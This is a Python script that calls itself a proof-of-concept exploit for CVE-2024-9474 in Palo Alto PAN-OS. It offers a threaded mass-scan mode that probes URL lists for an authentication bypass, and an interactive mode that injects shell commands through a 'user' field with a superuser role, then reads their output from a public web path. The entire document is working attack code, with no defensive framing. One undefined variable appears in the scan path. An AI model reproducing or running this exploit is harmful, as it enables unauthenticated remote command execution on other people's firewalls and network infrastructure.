import os
import random
import requests
import threading
import time
import re
import argparse

base_url = ""
file_path = ""
output = "output.txt"
threads = 200
urls = []
output_lock = threading.Lock()

class ExploitClient:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "deathvu provided",
            "X-PAN-AUTHCHECK": "off"
        })

    def new_request(self, method, url, payload=None):
        if method == 'GET':
            return self.session.get(url, verify=False)
        elif method == 'POST':
            return self.session.post(url, data=payload, verify=False)

def parse_args():
    global base_url, file_path, threads, output

    parser = argparse.ArgumentParser(description='Palo Alto PAN-OS Exploit PoC CVE-2024-9474')
    parser.add_argument('-u', '--url', help='Target base URL (e.g., http://example.com).')
    parser.add_argument('-t', '--threads', type=int, default=200, help='threads')
    parser.add_argument('-f', '--file', help='File with multiple URLs')
    parser.add_argument('-o', '--output', default='output.txt', help='Output file for scan results.')

    args = parser.parse_args()

    base_url = args.url
    file_path = args.file
    threads = args.threads
    output = args.output

    if file_path and base_url:
        print("[error] Cannot use both Scan Mode and Exploit Mode at the same time.")
        exit(1)

    if not file_path and not base_url:
        print("[error] Must specify either Scan Mode (--file) or Exploit Mode (--url).")
        exit(1)

def save_to_file(data):
    with output_lock:
        with open(output, 'a') as f:
            f.write(data)

def scan_mode_func(url, bar, ec):
    full_url = f"{url}/php/ztp_gate.php/.js.map"
    resp = ec.new_request("GET", full_url)

    if resp.status_code == 200 and "Zero Touch Provisioning" in resp.text:
        save_to_file(f"{url} - Auth Bypass successful\n")
        print(f"[+] {url} - Auth Bypass successful")

    bar.update(1)

def exploit_mode_func(url, ec):
    output_name = f"{random.randint(0, 9999)}.txt"

    while True:
        cmd = input("# ").strip()

        if cmd.lower() == "exit":
            print("[+] Exiting interactive shell.")
            break

        payload = f"user=`echo $( {cmd} ) > /var/appweb/htdocs/unauth/{output_name}`&userRole=superuser&remoteHost=&vsys=vsys1"
        full_url = f"{url}/php/utils/createRemoteAppwebSession.php/peppa.js.map"
        req = ec.new_request("POST", full_url, payload)

        print(f"[+] {url} - Raw Request:\n{req.request.headers}\nPayload: {payload}")

        resp = req
        response_body = resp.text
        print(f"[+] {url} - Response Body:\n{response_body}")

        phpsessid_match = re.search(r'@start@PHPSESSID=([a-zA-Z0-9]+)@end@', response_body)
        phpsessid = phpsessid_match.group(1) if phpsessid_match else ""

        if phpsessid:
            index_url = f"{url}/index.php/.js.map"
            index_req = ec.new_request("GET", index_url)
            index_req.cookies.set('PHPSESSID', phpsessid)
            ec.new_request("GET", index_url)

        output_url = f"{url}/unauth/{output_name}"
        output_req = ec.new_request("GET", output_url)

        if output_req.status_code == 200:
            output_body = output_req.text
            print(f"[+] {url} - Command Output:\n{output_body}")
        else:
            print(f"[-] {url} - Failed to retrieve command output with status code: {output_req.status_code}")


def main():
    global urls

    parse_args()

    if file_path:
        with open(file_path) as f:
            urls = [line.strip() for line in f]
    else:
        urls.append(base_url)

    ec = ExploitClient()

    if len(urls) > 1:
        threads_list = []

        for url in urls:
            thread = threading.Thread(target=scan_mode_func, args=(url, bar, ec))
            threads_list.append(thread)
            thread.start()

        for thread in threads_list:
            thread.join()

        bar.close()
    else:
        exploit_mode_func(urls[0], ec)

if __name__ == "__main__":
    main()

